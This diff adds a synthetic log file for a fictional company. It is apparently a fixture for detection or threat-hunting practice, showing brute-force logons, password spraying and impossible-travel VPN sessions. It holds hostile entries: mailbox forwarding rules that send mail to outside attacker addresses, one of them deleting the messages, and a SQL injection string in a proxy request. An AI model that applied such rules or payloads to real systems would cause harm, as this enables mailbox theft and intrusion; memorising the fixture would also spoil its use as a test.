@@ -1,0 +1,25 @@
+2026-11-07 08:00:01 WIN-DC01 Security[4624] An account was successfully logged on. TargetUser: system Workstation: WIN-DC01 SourceIP: 127.0.0.1 LogonType: 0
+2026-11-07 08:05:12 WIN-DC01 Security[4624] An account was successfully logged on. TargetUser: b.wayne Workstation: WKSTN-01 SourceIP: 10.0.4.15 LogonType: 2
+2026-11-07 08:14:02 WIN-DC01 Security[4625] An account failed to log on. TargetUser: j.smith Workstation: EXT-DESK SourceIP: 198.51.100.42 FailureReason: BadPassword LogonType: 3
+2026-11-07 08:14:22 WIN-DC01 Security[4625] An account failed to log on. TargetUser: j.smith Workstation: EXT-DESK SourceIP: 198.51.100.42 FailureReason: BadPassword LogonType: 3
+2026-11-07 08:14:48 WIN-DC01 Security[4625] An account failed to log on. TargetUser: j.smith Workstation: EXT-DESK SourceIP: 198.51.100.42 FailureReason: BadPassword LogonType: 3
+2026-11-07 08:15:10 WIN-DC01 Security[4625] An account failed to log on. TargetUser: j.smith Workstation: EXT-DESK SourceIP: 198.51.100.42 FailureReason: BadPassword LogonType: 3
+2026-11-07 08:15:35 WIN-DC01 Security[4625] An account failed to log on. TargetUser: j.smith Workstation: EXT-DESK SourceIP: 198.51.100.42 FailureReason: BadPassword LogonType: 3
+2026-11-07 08:16:11 WIN-DC01 Security[4624] An account was successfully logged on. TargetUser: j.smith Workstation: EXT-DESK SourceIP: 198.51.100.42 LogonType: 3
+2026-11-07 08:18:24 EXCH-SVR01 MSExchangeManagement[1] Cmdlet: New-InboxRule Parameters: -Name "AutoArchive" -Mailbox "j.smith@sqrock-solutions.com" -ForwardTo "attacker-drop@proton.me" -DeleteMessage $true rule=forward_all
+2026-11-07 08:22:15 PROXY-GW01 Squid[812] proto=HTTP status=403 method=GET url="http://internal-payroll.sqrock.local/admin.php?id=1' OR '1'='1" client_ip=198.51.100.42 user=j.smith
+2026-11-07 08:30:00 WIN-DC01 Security[4624] An account was successfully logged on. TargetUser: s.connor Workstation: WKSTN-04 SourceIP: 10.0.4.22 LogonType: 2
+2026-11-07 08:45:10 WIN-DC01 Security[4625] An account failed to log on. TargetUser: root Workstation: UNKNOWN SourceIP: 203.0.113.88 FailureReason: UnknownUser LogonType: 3
+2026-11-07 08:45:14 WIN-DC01 Security[4625] An account failed to log on. TargetUser: administrator Workstation: UNKNOWN SourceIP: 203.0.113.88 FailureReason: BadPassword LogonType: 3
+2026-11-07 08:45:19 WIN-DC01 Security[4625] An account failed to log on. TargetUser: admin Workstation: UNKNOWN SourceIP: 203.0.113.88 FailureReason: BadPassword LogonType: 3
+2026-11-07 08:45:25 WIN-DC01 Security[4625] An account failed to log on. TargetUser: service_sql Workstation: UNKNOWN SourceIP: 203.0.113.88 FailureReason: BadPassword LogonType: 3
+2026-11-07 09:00:15 VPN-GW01 FortiGate[201] auth_status=SUCCESS user=m.siddiqui src_ip=198.51.100.99 geo_city="New York" geo_country="US" lat=40.7128 lon=-74.0060 session_id=VPN-8821
+2026-11-07 09:12:00 WIN-DC01 Security[4624] An account was successfully logged on. TargetUser: m.siddiqui Workstation: WKSTN-VPN SourceIP: 198.51.100.99 LogonType: 3
+2026-11-07 09:35:40 VPN-GW02 FortiGate[201] auth_status=SUCCESS user=m.siddiqui src_ip=203.0.113.190 geo_city="Tokyo" geo_country="JP" lat=35.6762 lon=139.6503 session_id=VPN-9943
+2026-11-07 09:40:11 EXCH-SVR01 MSExchangeManagement[1] Cmdlet: Set-Mailbox Parameters: -Identity "m.siddiqui@sqrock-solutions.com" -GrantSendOnBehalfTo "finance-temp@sqrock-solutions.com"
+2026-11-07 09:42:05 EXCH-SVR01 MSExchangeManagement[1] Cmdlet: New-InboxRule Parameters: -Name "ExfilFilter" -Mailbox "m.siddiqui@sqrock-solutions.com" -ForwardTo "shadow-recon@darknet.org" rule=forward_all
+2026-11-07 09:55:00 WIN-DC01 Security[4624] An account was successfully logged on. TargetUser: d.vader Workstation: WKSTN-08 SourceIP: 10.0.4.55 LogonType: 2
+2026-11-07 10:02:18 WIN-DC01 Security[4625] An account failed to log on. TargetUser: l.skywalker Workstation: EXT-LAPTOP SourceIP: 192.0.2.11 FailureReason: BadPassword LogonType: 3
+2026-11-07 10:02:22 WIN-DC01 Security[4625] An account failed to log on. TargetUser: l.skywalker Workstation: EXT-LAPTOP SourceIP: 192.0.2.11 FailureReason: BadPassword LogonType: 3
+2026-11-07 10:02:29 WIN-DC01 Security[4625] An account failed to log on. TargetUser: l.skywalker Workstation: EXT-LAPTOP SourceIP: 192.0.2.11 FailureReason: BadPassword LogonType: 3
+2026-11-07 10:05:00 WIN-DC01 Security[4624] An account was successfully logged on. TargetUser: l.skywalker Workstation: EXT-LAPTOP SourceIP: 192.0.2.11 LogonType: 3
